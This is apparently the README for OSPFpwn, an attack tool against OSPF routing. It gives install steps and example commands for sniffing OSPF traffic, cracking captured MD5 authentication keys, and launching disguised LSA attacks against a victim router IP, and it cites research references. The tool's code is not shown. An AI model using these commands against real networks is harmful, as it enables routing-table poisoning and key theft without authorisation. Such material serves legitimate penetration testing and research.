# OSPFpwn

A tool used to attack OSPF implementations

Attacks implemented
- monitoring OSPF networks
- cracking OSPFMD5 Authentication
- Disguised LSA attack
- Disguised LSA attack (MD5 authenticated network)

# installation
```
python -m venv venv
./venv/Script/activate
pip install -r requirements.txt
replace scapy's ospf.py in `scapy/contrib/ospf.py` with the ospf.py from the dependencies folder
```

# usage

python ospfpwn.py -a `<attack>`

    1 - sniffing OSPF networks
    2 - cracking OSPFMD5 Authentication

python ospfpwn.py -a 1 -i `<interface>`

python ospfpwn.py -a 2 -f `<pcap file>` -b

python ospfpwn.py -a 2 -f `<pcap file>` -w `<wordlist>`

**Disguised LSA attack (Unauthenticated network)**

python attacks/disguised_lsa.py -v `<victim router ip>` -n `<neighbour router ip>` -i `<interface>`

``` python
python attacks/disguised_lsa.py -v 192.168.21.5 -n 192.168.21.6 -i eth0
```

**Disguised LSA attack (MD5 authenticated network)**

python attacks/disguised_lsa.py -v `<victim router ip>` -n `<neighbour router ip>` -i `<interface>` -k `<key>`

``` python
python attacks/disguised_lsa.py -v 192.168.21.5 -n 192.168.21.6 -i eth0 -key 123
```

# Future works
- Single Path Injection
- Remote False Adajency
    

# References 
- Blackhat 2011: Owning the routing table
    - https://media.blackhat.com/bh-us-11/Nakibly/BH_US_11_Nakibly_Owning_the_Routing_Table_Slides.pdf
    - https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2011/BH_US_11_Nakibly_Owning_the_Routing_Table_WP.pdf
    - https://crypto.stanford.edu/~dabo/pubs/papers/ospf.pdf
- https://microlab.red/2018/05/03/practical-routing-attacks-2-3-ospf/
    - https://github.com/illordlo/exploits/blob/master/routing/ospf-disguised-lsa.py
- https://github.com/mastinux/ospf-remote-false-adjacency-attack
- https://github.com/c4s73r/OSPFMD5Crack
- http://networkingbodges.blogspot.com/2013/10/offline-attack-on-md5-keys-in-captured.html?m=1
- https://www4.comp.polyu.edu.hk/~shanggao/publications/Novel_Attacks_in_OSPF_Networks_to_Poison_Routing_Table.pdf
